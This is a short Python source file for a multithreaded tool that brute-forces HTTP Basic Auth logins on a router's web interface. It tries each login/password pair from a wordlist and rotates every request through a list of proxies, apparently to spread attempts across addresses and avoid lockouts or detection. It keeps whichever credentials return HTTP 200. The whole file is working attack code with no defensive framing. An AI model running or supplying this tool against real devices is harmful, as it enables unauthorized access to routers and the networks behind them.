import threading
from requests.auth import HTTPBasicAuth

import requests


class Router(threading.Thread):
    working = False
    finished = False
    login = None
    password = None

    def __init__(self, proxy_list, router, wordlist, port):
        super().__init__()
        self.address = router
        self.proxies = proxy_list
        self.wordlist = wordlist
        self.port = port

    def run(self):
        self.working = True
        i = 0

        for credentials in self.wordlist:
            proxy_dict = {
                "http": f'http://{self.proxies[i]}',
                "https": f'https://{self.proxies[i]}',
            }
            i += 1
            try:
                response = requests.get(f'http://{self.address}:{self.port}', proxies=proxy_dict,
                                        auth=HTTPBasicAuth(credentials.login, credentials.password))
                if response.status_code == 200:
                    self.working = False
                    self.finished = True
                    self.login = credentials.login
                    self.password = credentials.password
                    return
            except:
                pass

            if i >= len(self.proxies):
                i = 0

        self.working = False
        self.finished = True
